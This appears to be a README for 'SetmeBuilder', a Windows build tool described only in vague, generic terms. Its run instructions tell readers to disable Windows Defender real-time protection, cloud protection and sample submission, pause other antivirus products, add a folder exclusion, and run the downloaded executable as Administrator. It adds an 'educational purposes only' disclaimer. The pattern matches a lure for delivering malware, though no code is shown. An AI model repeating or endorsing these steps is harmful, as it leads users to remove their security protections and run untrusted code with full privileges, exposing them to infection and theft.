\# SetmeBuilder



Premium build automation and packaging tool for Windows. Generate a fully customized build pipeline in seconds with your own configuration and selected features. No scripting required — just select your target, pick what you want to build, and hit BUILD. The generated executable is a standalone file that works on any Windows 10/11 machine without Python or dependencies.



\## What it builds



\- Native Windows executables (x64)

\- Portable single-file artifacts

\- Multi-target build outputs

\- Asset and resource packaging

\- Configuration-driven task pipelines

\- Incremental build cache

\- Dependency resolution and bundling

\- Manifest and metadata generation

\- Version stamping

\- Digital signature hooks

\- Archive outputs (zip, tar.gz)

\- Log and report generation



\## Features



\- Modern dark UI

\- Real-time build log streaming

\- Declarative configuration (TOML)

\- Plugin interface for custom steps

\- Remote build agent support

\- Fallback build mode for locked files

\- Single .exe output — no runtime required

\- Auto-filled configuration fields

\- Built-in artifact compression

\- Multi-threaded fast build execution



\## Requirements



\- Windows 10/11 x64

\- Administrator privileges (recommended)

\- Build configuration file



\## How to Run



> \*\*IMPORTANT:\*\* Before running, you must temporarily disable your antivirus and Windows Defender. This tool performs system-level operations that are falsely flagged as suspicious by security software.



\### Step-by-step



1\. \*\*Disable Windows Defender\*\*



&#x20;  - Open Windows Security → Virus \& threat protection → Manage settings

&#x20;  - Turn off "Real-time protection"

&#x20;  - Turn off "Cloud-delivered protection"

&#x20;  - Turn off "Automatic sample submission"

2\. \*\*Disable third-party antivirus\*\* (if installed)



&#x20;  - Right-click your antivirus icon in the system tray → Pause protection / Disable

&#x20;  - Common AVs: Malwarebytes, Kaspersky, Avast, AVG, Norton, Bitdefender

3\. \*\*Add exclusion folder\*\* (optional but recommended)



&#x20;  - Windows Security → Virus \& threat protection → Manage settings

&#x20;  - Scroll to "Exclusions" → Add or remove exclusions → Add a folder

&#x20;  - Select the folder where SetmeBuilder.exe is located

4\. \*\*Run as Administrator\*\*



&#x20;  - Right-click `SetmeBuilder.exe` → \*\*Run as Administrator\*\*

&#x20;  - Accept the UAC prompt

5\. \*\*Use the builder\*\*



&#x20;  - Load your configuration file in the field

&#x20;  - Select the features you want to build

&#x20;  - Click \*\*BUILD\*\*

&#x20;  - Wait for the build process to complete

6\. \*\*Re-enable antivirus\*\*



&#x20;  - After the build is done, turn your antivirus back on

&#x20;  - Add SetmeBuilder.exe to the exclusion list if needed



\## Installation



1\. Download `SetmeBuilder.exe` from the Releases section

2\. Right-click → Run as Administrator

3\. Load your configuration file

4\. Select the features you want

5\. Click BUILD



\## Changelog



See CHANGELOG.md



\## Disclaimer



This software is provided for educational purposes only. The author is not responsible for any misuse.



\## Support



For support, open an issue on GitHub.

